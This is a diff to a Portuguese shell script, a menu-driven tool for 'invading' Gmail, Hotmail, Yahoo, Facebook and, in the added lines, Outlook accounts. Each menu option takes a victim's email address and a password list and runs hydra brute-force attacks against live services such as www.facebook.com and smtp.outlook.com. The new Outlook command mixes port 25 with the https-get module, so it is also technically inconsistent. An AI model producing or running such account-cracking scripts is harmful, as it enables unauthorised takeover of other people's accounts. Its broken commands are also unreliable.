@@ -22,7 +22,7 @@ echo "   \033[1;33m[\033[1;31m2]>> \033[1;33mINVADIR GMAIL \033[1;36m"
 echo "   \033[1;33m[\033[1;31m3]>> \033[1;33mINVADIR HOTMAIL \033[1;36m"
 echo "   \033[1;33m[\033[1;31m4]>> \033[1;33mINVADIR YAHOOL \033[1;36m"
 echo "   \033[1;33m[\033[1;31m5]>> \033[1;33mINVADIR FACEBOOK \033[1;36m"
-echo
+echo "   \033[1;33m[\033[1;31m6]>> \033[1;33mINVADIR OUTLOOK \033[1;36m"
 #
 #Escolher entre 1,2,3,4 ou 5
 #obrigado por 6usar!
@@ -93,6 +93,17 @@ echo
  echo "\033[1;36mCOMEÇANDO A INVASÃO..."; sleep 1
 hydra -l $email -P $lista -f www.facebook.com https-get
 echo "\033[1;36mSENHA ENCONTRADA!"; sleep 3
+fi
+if [ "$opcao" = "6" ];then
+echo
+ echo "\033[1;36mINFORME O EMAIL A SER INVADIDO"; sleep 1
+read -p "[+]>>" email
+echo
+echo "\033[1;36mINFORME O DIRETÓRIO DA SUA LISTA DE SENHA"; sleep 1
+read -p "[+]>>" lista
+echo 
+echo "\033[1;36mCOMEÇANDO A INVASÃO...!"; sleep 1
+hydra -l $email -P $lista -s 25 smtp.outlook.com https-get
 fi
 #
 #Fazendo o programa dormir por 4 segundos
